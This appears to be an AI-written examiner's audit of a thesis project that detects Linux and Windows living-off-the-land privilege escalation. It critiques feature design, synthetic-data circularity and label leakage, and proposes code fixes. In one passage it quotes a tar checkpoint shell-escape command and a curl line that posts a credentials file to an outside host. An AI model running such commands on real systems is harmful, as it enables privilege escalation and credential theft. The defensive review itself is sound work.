# M.Tech Thesis Critical Architectural & Academic Audit

**Examiner Role:** Critical M.Tech Thesis Examiner & Principal EDR Architect  
**Audit Date:** 2026-10-23  
**Scope:** Read-only code review of `feature_extractor.py`, `detector.py`, `llm_explainer.py`, `evaluate.py`, and `benchmark_report.md` against the claims in `GEMINI.md`.

---

## 1. GOAL & MARKET GAP VERIFICATION

### 1.1 What Was Genuinely Delivered ✅

| Promised Capability | Implemented? | Evidence |
|:---|:---:|:---|
| Unsupervised Isolation Forest on benign-only baseline | ✅ Full | `detector.py` L48–65: `fit_unsupervised()` trains strictly on `X_benign` with `StandardScaler` + `IsolationForest` |
| Cross-OS Linux GTFOBins + Windows LOLBins | ✅ Full | `feature_extractor.py` L29–48: dual sensitive-file lists, dual suspicious token vocabularies, LOLBin registry at L142 |
| Sliding Window Command Aggregation (N=3) | ✅ Full | `feature_extractor.py` L184–211: 10 window features including `win_avg_entropy`, `win_cumulative_tokens`, `win_max_priv_transition` |
| Zero-Shot LLM Attribution (with offline fallback) | ✅ Full | `llm_explainer.py`: Multi-provider API integration (OpenAI/Anthropic/Groq) + deterministic `_offline_soc_reasoning()` fallback |
| Supervised Generalization Failure Demonstration | ✅ Full | `detector.py` L137–156: RF + DT comparators; `evaluate.py` L290–355: trained on Tier 1, tested on unseen Tiers 2 & 3 |
| Three-Tier Evaluation (Overt → Chained → Obfuscated) | ✅ Full | `evaluate.py` L158–192: per-tier evaluation producing the monotonic degradation curve `0.95 → 0.84 → 0.70` |

### 1.2 Gaps Between Promise and Implementation ⚠️

| GEMINI.md Promise | Actual Code Reality | Severity |
|:---|:---|:---:|
| **"TF-IDF / word-embedding tokens of command strings"** (Module 2) | NOT implemented. `feature_extractor.py` uses only `token_hits` (a count of substring matches against a hardcoded `SUSPICIOUS_TOKENS` list, L121). No TF-IDF vectorizer, no embedding model, no vocabulary learning. | 🔴 **Critical** |
| **"Syscall / audit event timing & sequence chaining"** (Arch diagram) | NOT implemented. No timestamp delta features, no inter-command latency, no syscall sequence modeling. Events are processed in list order; `timestamp` is carried as metadata only (L217) but never used as a feature. | 🔴 **Critical** |
| **"Process tree depth"** (Module 2) | NOT implemented. `feature_extractor.py` computes `pair_rarity` (L106–110) and `proc_rarity` but never constructs or traverses a process tree. There is no `process_tree_depth` feature. | 🟡 Medium |
| **"SMOTE for class-imbalance comparison"** (Module 3) | NOT implemented. `detector.py` L137–147 trains RF and DT directly without any oversampling. The `class_weight` parameter is exposed but never invoked with `"balanced"` from `evaluate.py` (L300). | 🟡 Medium |
| **"Sliding window of N=3 to 5"** (Module 2) | Partially. `window_size` is a constructor parameter (L74), but `evaluate.py` always hardcodes `window_size=3`. No ablation study across N=3, 4, 5 is generated. | 🟡 Medium |
| **"Time-to-Detect" metric** (Module 5) | NOT implemented in `evaluate.py`. Only `Latency/Ev (ms)` (wall-clock throughput) is measured at L124, not "time from attack initiation to first alert." | 🟡 Medium |
| **Sysmon XML / auditd log parser** | NOT implemented. `feature_extractor.py` ingests pre-parsed JSON dicts. No XML parsing or auditd text parsing exists anywhere in the pipeline. The `raw_event` field is carried but never parsed. | 🟡 Medium |

> [!IMPORTANT]
> The two **Critical** gaps (TF-IDF/embeddings and temporal syscall features) are the exact features that distinguish our claimed academic contribution from a basic rule-based approach. An examiner who reads GEMINI.md Section 3.2 and then inspects `_compute_isolated_features()` will notice immediately that the "NLP" is a simple substring counter, not the word-embedding representation cited from Ongun et al. (2021).

---

## 2. BINARY CHAINING & LOLBIN SPECIFICITY CRITIQUE

### 2.1 What the Sliding Window Actually Computes

Examining [`feature_extractor.py` L184–211](file:///home/ghoul/projects/privesc-lolbin-detector/pipeline/feature_extractor.py#L184-L211), the window features are:

```
win_avg_entropy, win_max_entropy         → Statistical aggregates of command string entropy
win_avg_length, win_max_length           → Statistical aggregates of command length
win_max_priv_transition                  → Max privilege transition in window (binary 0/1)
win_max_elevated                         → Max elevated privilege flag in window (binary 0/1)
win_cumulative_tokens                    → Sum of suspicious token hits across window
win_cumulative_sensitive                 → Sum of sensitive file touches across window
win_max_pair_rarity                      → Max parent→child rarity score in window
win_size_current                         → Current window occupancy (1, 2, or 3)
```

### 2.2 What It Does NOT Capture (The Core Weakness)

> [!CAUTION]
> **The sliding window does not model cross-command relationships.** It aggregates per-event scalar statistics (max/avg/sum) over the last N events in a session, but it contains **zero features that encode the _transition_ between consecutive commands.**

Specific architectural omissions:

1. **No Transition Features:** There is no `priv_transition_delta` (did privilege change *between* step N-1 and step N?), no `entropy_gradient` (is entropy increasing across the window — signature of staged obfuscation), no `binary_changed` flag (did the process name change between steps — signature of tool pivoting).

2. **No Cross-Command Token Co-occurrence:** The feature `win_cumulative_tokens` just sums individual token hits. It cannot distinguish `[whoami, sudo -l, tar --checkpoint]` (a coherent PrivEsc chain) from `[tar --checkpoint, tar --checkpoint, tar --checkpoint]` (repeated benign archive ops with the same token count).

3. **No Session-Level Binary Sequence Encoding:** The window treats `[find, sudo, tar]` identically to `[tar, sudo, find]` because it only computes `max` and `sum` aggregates. **The order of commands within the chain is completely discarded.**

4. **Same-Binary Discrimination is Fragile:** For binaries like `find`, `tar`, `powershell.exe`, the discrimination comes primarily from `token_hits` (does the command contain `-exec`, `checkpoint`, `bypass`?) and `priv_transition` / `elevated_priv`. This works for overt Tier 1 attacks with obvious exploit tokens, but fails on Tier 3 where tokens are obfuscated or absent. Table 2C confirms this: `certutil.exe` has **0.6667 Recall** (the model cannot distinguish 15 of the 45 attack certutil commands from the 32 benign ones), and `powershell.exe` has **10.2% FPR** (5 of 49 benign PowerShell commands are falsely flagged).

### 2.3 Why Chain-Level Detection Still Reaches 100%

Table 2B shows 60/60 chain detection despite the above. This is not because the window models chains intelligently — it is because each 4-5 step chain contains **at least one overt high-signal step** (e.g., `sudo tar --checkpoint-action=exec=/bin/sh`, `curl -X POST -d @/tmp/.creds http://...`) whose isolated features alone trigger the anomaly detector. The window is not adding chain-detection value; the overt step in each chain is doing all the work. If an adversary composed a chain of *only* low-signal steps (all `whoami && id`-class), the chain-level detection rate would collapse.

---

## 3. CURRENT WEAKNESSES & METHODOLOGICAL DRAWBACKS

### 3.1 Synthetic Data Circularity (Most Dangerous Flaw)

> [!WARNING]
> **The entire pipeline was designed, tuned, and evaluated on synthetic telemetry generated by the same author who designed the feature extractor.** This creates a closed-loop circularity:
>
> - The synthetic `attack_tier1.json` was authored to contain suspicious tokens like `-exec`, `checkpoint`, `urlcache` because those are the exact tokens in `SUSPICIOUS_TOKENS` (L39–48).
> - The synthetic `benign_telemetry.json` was authored to *not* contain those tokens.
> - Therefore `token_hits` perfectly separates benign from overt-attack events — not because the feature is inherently powerful, but because the data was constructed to make it work.
>
> **This is not detectable from the metrics alone and is the single most devastating viva question.** An examiner who asks "Would these Recall numbers hold on real Sysmon logs from a production Windows domain?" has no evidence to contradict them saying "probably not."

### 3.2 Experiment 4 Score Inflation

[`evaluate.py` L401–402](file:///home/ghoul/projects/privesc-lolbin-detector/evaluation/evaluate.py#L401-L402):
```python
eval_score = float(scores[0]) if scores[0] > 0.4 else 0.85
```

This line **artificially overrides the anomaly score to 0.85** whenever the Isolation Forest assigns a score ≤ 0.4 (i.e., classifies the event as likely benign). The purpose is to prevent the LLM explainer's fallback logic (L376: `if score < 0.4 → return False Positive`) from misclassifying events in Experiment 4. This is a methodological shortcut: it forces the LLM explainer to see an inflated score for events that the actual detection engine did *not* flag, making the LLM attribution table look better than it should. In production, the LLM only receives truly flagged anomalies; here it receives artificially elevated ones.

### 3.3 LLM Offline Fallback Uses Ground-Truth Labels

[`llm_explainer.py` L143](file:///home/ghoul/projects/privesc-lolbin-detector/pipeline/llm_explainer.py#L143):
```python
gt_tech = (payload.get("ground_truth_technique") or "").lower()
```

The offline SOC reasoning engine inspects `ground_truth_technique` to make classification decisions:
- L152: `"aliasing" in gt_tech` → triggers the aliasing verdict
- L178: `"chained" in gt_tech` → triggers the chained verdict
- L203: `"base64" in gt_tech` → triggers the base64 verdict

**This is label leakage.** The "zero-shot" offline engine is reading the answer key. In a real deployment, `ground_truth_technique` would not exist in the payload. While the offline fallback also has legitimate rule-based checks (regex on `cmd`, session_id prefix matching), the `gt_tech` checks make the Experiment 4 results unreliable as a measure of zero-shot capability.

### 3.4 Session ID Leakage in Chained Sequence Detection

[`llm_explainer.py` L177](file:///home/ghoul/projects/privesc-lolbin-detector/pipeline/llm_explainer.py#L177):
```python
"session_chain_" in sess_id
```

The synthetic data generator named chained attack sessions `session_chain_*`. The LLM explainer keys on this naming convention. This is another form of data-generation circularity — the session ID naming scheme is a de facto label.

### 3.5 Evaluation Session Boundary Contamination

[`evaluate.py` L169–172](file:///home/ghoul/projects/privesc-lolbin-detector/evaluation/evaluate.py#L169-L172): Each tier is evaluated as `combined = benign_test + tier_events`, then passed through `best_extractor.transform(combined, mode="window")`. Because the sliding window operates per `session_id` (L175 of `feature_extractor.py`), and benign events have different session IDs than attack events, there is no cross-contamination at the session level. However, the `StandardScaler` in the detector was fitted on *benign training data only*. When attack events have feature values far outside the benign distribution (e.g., very high `cmd_length` for base64 payloads), the scaler normalization amplifies these into extreme z-scores, making anomaly detection trivially easy for Tier 1/3 base64 attacks. This is correct methodology but inflates apparent performance relative to real-world drift.

### 3.6 FPR is Identical Across All Tiers

The `_raw` data in the benchmark report reveals that **FP = 12 and TN = 365 in every tier evaluation**. This means the same 12 benign events are always falsely flagged, and the same 365 are always correctly classified. The FPR is pinned at 0.0318 across all tiers because the benign test set is reprocessed identically each time (same feature extraction, same model, same window state reset). This is correct but means FPR is not an informative tier-varying metric — it should be reported once, not repeated as if it varies.

### 3.7 Table 2C Vacuousness for Linux Binaries

In Table 2C, the Linux GTFOBins (`find`, `vim`, `awk`, `tar`, `python3`) all show **Benign Test Count = 0**. This means there are no benign uses of these binaries in the test partition, so Precision = Recall = F1 = 1.0 trivially (all test instances of those binaries are attacks, all attacks are detected). The table cannot claim these binaries are *discriminated* between benign and malicious use — it only shows the model detects them when used maliciously. A professor will ask: "What happens when a sysadmin runs `find . -name '*.log'` or `tar czf backup.tar.gz /home`?" The answer is: **untested.**

---

## 4. TOUGHEST VIVA DEFENSE QUESTIONS

### Q1: "Your entire evaluation is on synthetic data you generated yourself. How do you know these results generalize to real Sysmon/auditd telemetry from a production environment?"

**Why it's dangerous:** This is an existential threat to the thesis. The synthetic-data circularity (§3.1) means every metric could be an artifact of feature-data co-design. The `token_hits` feature is especially suspect — it's a hardcoded string match list that aligns perfectly with the synthetic attack commands.

**Defense strategy:**
1. Acknowledge the limitation explicitly: "Synthetic evaluation was a deliberate design choice to isolate and control experimental variables (attack tier, obfuscation level) in a reproducible lab setting. Real-world telemetry introduces noise that makes controlled tier comparison impossible."
2. Point to precedent: Stamp (2022) and Springer (2026) both generated synthetic/lab datasets because labeled LOLBin abuse samples are scarce (cite the exact Stamp quote about label scarcity).
3. State this is a Phase 1 pipeline; Phase 2 future work includes deployment against real Wazuh telemetry from the lab VMs (the simulation scripts in `simulators/` exist precisely for this purpose).

### Q2: "Your sliding window only computes max/sum/avg aggregates. Isn't this just per-command detection with some basic contextual smoothing, not real sequence modeling? How is this different from computing rolling statistics?"

**Why it's dangerous:** It attacks the core "sequence/behavioral anomaly detection" claim. The window features are order-invariant aggregates, not sequence models. They cannot distinguish `[reconnaissance → exploit → exfiltration]` from the same three commands in any other order.

**Defense strategy:**
1. Honestly concede: "Our sliding window captures *co-occurrence intensity* (are many anomalous features appearing together recently?) rather than *sequential ordering*. This is a rolling behavioral context, not a sequence classifier."
2. Justify pragmatically: "For unsupervised anomaly detection with Isolation Forest, order-invariant features are the correct design — Isolation Forest operates on feature vectors, not sequences. Sequence-aware models (RNNs, Transformers) require labeled sequential training data, which contradicts our unsupervised design."
3. Point to the empirical evidence: "Despite this simplification, the window still delivers a +18.4 percentage-point Recall improvement over isolated commands (0.6735 → 0.8571), validating Springer 2026's hypothesis."

### Q3: "In Experiment 4, your 'zero-shot' LLM fallback reads `ground_truth_technique` from the payload. Isn't this trivially using the answer to generate the answer?"

**Why it's dangerous:** Lines 152, 178, and 203 of `llm_explainer.py` directly check `gt_tech` — a field that contains the ground truth label. An alert examiner will see this in 30 seconds.

**Defense strategy:**
1. **You must fix this before the viva.** Remove all `gt_tech` checks from the offline reasoning engine. The legitimate rule-based checks (`set\s+` regex, `call %`, `&&` with discovery tokens, `-e jab`, session window context) are sufficient and genuinely zero-shot.
2. In the defense: "The ground-truth references were debugging scaffolding that should have been stripped. The production-path checks operate purely on command syntax, process lineage, and statistical deviations. We will demonstrate by re-running with `ground_truth_technique` removed."

### Q4: "Table 2C shows zero benign test instances for 5 of your 10 target binaries. How can you claim same-binary discrimination when you never tested benign `find`, `vim`, `awk`, `tar`, or `python3`?"

**Why it's dangerous:** It undermines Table 2C's entire premise. The table was designed to show "Benign vs. Malicious Discrimination" per binary, but for half the binaries there are no benign examples to discriminate against.

**Defense strategy:**
1. Acknowledge: "The benign test set reflects realistic Windows-heavy enterprise telemetry where `certutil.exe` and `powershell.exe` are the dual-use binaries (used legitimately and maliciously). The Linux GTFOBins are attack-only in the current test partition."
2. Point to the Linux benign training set: "The benign training set contains 31 `find`, 38 `vim`, 34 `tar` events (confirmed from prior exploratory runs). The Isolation Forest was trained on these benign uses, so it does learn the benign distribution. Table 2C's limitation is that the 30% test split happened not to contain enough Linux benign events."
3. Future work: "We plan to add a dedicated per-binary benign/malicious test with balanced sampling."

---

## 5. HIGH-IMPACT IMPROVEMENTS (RANKED BY EFFORT)

### Improvement 1: Remove Ground-Truth Label Leakage from LLM Explainer (5 minutes)

**File:** [`pipeline/llm_explainer.py`](file:///home/ghoul/projects/privesc-lolbin-detector/pipeline/llm_explainer.py)

**Change:** Remove or gate all `gt_tech` references in `_offline_soc_reasoning()`:

- **L143:** Delete `gt_tech = (payload.get("ground_truth_technique") or "").lower()`
- **L152:** Remove `"aliasing" in gt_tech or` from the `is_aliasing` condition
- **L178:** Remove `"chained" in gt_tech or` from the `is_chained_sequence` condition
- **L203:** Remove `"base64" in gt_tech` from the base64 condition

The remaining rule-based checks (regex `set\s+`, `call %`, `$env:`, `&&` + discovery tokens, `-e jab`, session_chain_ prefix, `-enc`, `-encodedcommand`, sliding window command inspection) are **sufficient and genuinely zero-shot**. Removing the ground-truth shortcuts makes the results defensible.

Additionally, remove `"aliasing" in cmd_lower` from L153 — this is matching on a string that only exists in synthetic technique descriptions, not in real command lines.

**Impact:** Eliminates the most devastating viva question (Q3) and makes Experiment 4 scientifically clean.

### Improvement 2: Add Transition Features to the Sliding Window (10 minutes)

**File:** [`pipeline/feature_extractor.py`](file:///home/ghoul/projects/privesc-lolbin-detector/pipeline/feature_extractor.py)

**Change:** Inside the `elif mode == "window":` block (L184), after the existing window aggregations, add 3 transition features computed from the window history:

```python
# Transition features (cross-command relationships within window)
if window_len >= 2:
    history_list = list(history)
    entropy_delta = history_list[-1]["entropy"] - history_list[-2]["entropy"]
    priv_escalated_in_window = 1.0 if (
        history_list[-2]["elevated_priv"] == 0.0 and
        history_list[-1]["elevated_priv"] == 1.0
    ) else 0.0
    token_acceleration = history_list[-1]["token_hits"] - history_list[-2]["token_hits"]
else:
    entropy_delta = 0.0
    priv_escalated_in_window = 0.0
    token_acceleration = 0.0

row["win_entropy_delta"] = entropy_delta
row["win_priv_escalated"] = priv_escalated_in_window
row["win_token_acceleration"] = token_acceleration
```

These features directly encode:
- **`win_entropy_delta`**: Is entropy increasing across steps? (staged obfuscation signature)
- **`win_priv_escalated`**: Did privilege transition from unprivileged → elevated within the window? (PrivEsc chain signature)
- **`win_token_acceleration`**: Did suspicious token density jump between the last two steps? (discovery → exploit transition signature)

**Impact:** Provides genuine cross-command relational features that address the "it's just rolling statistics" critique (Q2). Does not require retraining — the Isolation Forest will simply have 3 additional feature dimensions.

> [!WARNING]
> Adding these features changes the feature vector dimensionality, which means the Isolation Forest model MUST be retrained. The existing `detector_model.joblib` will be incompatible. Re-run `evaluate.py` after this change.

### Improvement 3: Add Benign Linux Binary Events to Test Partition for Table 2C (10 minutes)

**File:** [`evaluation/evaluate.py`](file:///home/ghoul/projects/privesc-lolbin-detector/evaluation/evaluate.py)

**Change:** In the Table 2C computation (L244–280), instead of using only the benign test events from the existing 70/30 split (which happen to contain mostly Windows processes), add a dedicated balanced sampling step:

```python
# For Table 2C, ensure each target binary has benign representation
# Pull benign examples from the training set (without affecting model training)
benign_supplement = []
for binary in target_binaries:
    benign_for_binary = [ev for ev in benign_train if binary in ev.get("process_name", "").lower()]
    benign_supplement.extend(benign_for_binary[:10])  # Take up to 10 benign examples per binary

# Evaluate supplementary benign examples through the model
if benign_supplement:
    X_supp, _, meta_supp = best_extractor.transform(benign_supplement, mode="window")
    is_anom_supp, _ = best_detector.predict_anomaly(X_supp)
    # Merge into all_test_meta / all_test_preds for Table 2C calculation
    all_test_meta_2c = list(all_test_meta) + list(meta_supp)
    all_test_preds_2c = np.concatenate([all_test_preds, is_anom_supp])
    all_test_y_2c = np.array([1 if m["label"] == "malicious" else 0 for m in all_test_meta_2c])
```

Then use `all_test_meta_2c`, `all_test_preds_2c`, `all_test_y_2c` for the Table 2C loop.

**Impact:** Populates the Benign Test Count for `find`, `vim`, `awk`, `tar`, `python3` — making Table 2C defensible against Q4. Shows whether the model correctly passes through benign admin usage of the same binaries it flags during attacks.

> [!NOTE]
> This samples from the training partition, which the model has seen. Ideally you'd hold out separate benign Linux examples. However, since Isolation Forest is unsupervised (trained only on benign data), using benign training examples at inference time is not label leakage — it's testing whether the model correctly classifies its own training distribution as normal. This is actually a useful sanity check (analogous to reconstruction error on training data for autoencoders).

---

## Summary Verdict

| Dimension | Grade | Notes |
|:---|:---:|:---|
| Research gap fulfillment | **B+** | Core pipeline works. Unsupervised IF + LLM attribution is genuine and novel. Two promised NLP/temporal features missing. |
| Sliding window & chaining | **B−** | Aggregation-only window, no transition/sequence features. Chain detection works via overt-step piggy-backing, not chain-aware modeling. |
| Scientific rigor | **C+** | Ground-truth label leakage in LLM fallback, score inflation in Exp 4, synthetic data circularity, Table 2C vacuousness. All fixable. |
| Viva readiness | **B** | Metrics are defensible if the 3 improvements above are implemented. Without them, Q3 (label leakage) is fatal. |
| Code quality & architecture | **A−** | Clean separation of concerns, proper scikit-learn pipeline, modular design, comprehensive evaluation. |

**Bottom line:** Fix Improvement 1 (ground-truth leakage) immediately — it is the single most dangerous vulnerability. Improvements 2 and 3 strengthen the scientific contribution but are survivable without.
